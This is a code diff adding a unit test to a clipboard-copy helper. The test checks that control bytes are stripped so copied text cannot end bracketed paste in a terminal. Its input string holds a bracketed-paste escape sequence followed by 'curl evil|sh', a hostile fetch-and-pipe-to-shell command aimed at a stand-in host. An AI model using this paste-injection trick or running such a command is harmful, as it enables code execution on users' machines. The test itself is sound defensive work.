@@ -28,6 +28,13 @@ describe('copyToClipboard', () => {
     expect(spawned).toEqual(['D:\\Win\\System32\\clip.exe', '/usr/bin/pbcopy'])
     expect(writes).toEqual(['\x1b]52;c;aGk=\x07'])
   })
+
+  it('drops control bytes so a copied reply cannot end bracketed paste in the shell', () => {
+    const writes: string[] = []
+    copyToClipboard('npm i x\x1b[201~\r\ncurl evil|sh\x9b\t.', (s) => writes.push(s), { SSH_TTY: '/dev/tty' })
+    const sent = Buffer.from(writes[0]?.slice(7, -1) ?? '', 'base64').toString()
+    expect(sent).toBe('npm i x[201~\r\ncurl evil|sh\t.')
+  })
 })
 
 describe('copy outcome', () => {
